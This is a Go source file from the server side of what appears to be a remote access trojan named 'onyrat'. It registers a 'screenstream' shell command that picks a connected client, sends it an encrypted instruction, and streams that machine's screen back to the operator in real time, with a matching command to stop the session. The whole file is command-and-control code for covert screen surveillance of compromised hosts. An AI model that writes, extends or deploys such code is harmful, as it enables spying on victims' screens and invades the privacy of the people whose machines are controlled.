//go:build server
// +build server

package handlers

import (
	"context"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/videostreaming"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterScreenStreamCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
	shell.AddCmd(&ishell.Cmd{
		Name:     "screenstream",
		Help:     "view the remote client's screen in real-time",
		LongHelp: "Usage: screenstream <id|address>\n\nEstablishes a real-time screen sharing session with the specified client.\nOpens a window displaying the client's screen, updating as new frames are received.\n\nExamples:\n  screenstream 1",

		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				c.Println("Type `screenstream help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: screenstream <id|address>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			address = client.Sess.RemoteAddr().String()

			stream, err := getStream(client)
			if err != nil {
				c.Println("Failed to get stream")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
				c.Println("Failed to send command to client")
				c.Err(err)
				return
			}

			inCtx, cancel := context.WithCancelCause(ctx)

			shell.AddCmd(&ishell.Cmd{
				Name: fmt.Sprintf("stop_screenstream_%s", address),
				Help: fmt.Sprintf("stop the screenstreaming session between the server and %s", address),

				Func: func(c *ishell.Context) {
					cancel(nil)
					shell.DeleteCmd(c.Cmd.Name)
				},
			})

			go func() {
				if err := videostreaming.ScreenstreamReceive(s, client, inCtx); err != nil {
					c.Printf("Failed to start screen stream: %v\n", err)
					return
				}
			}()
		},
	})
}
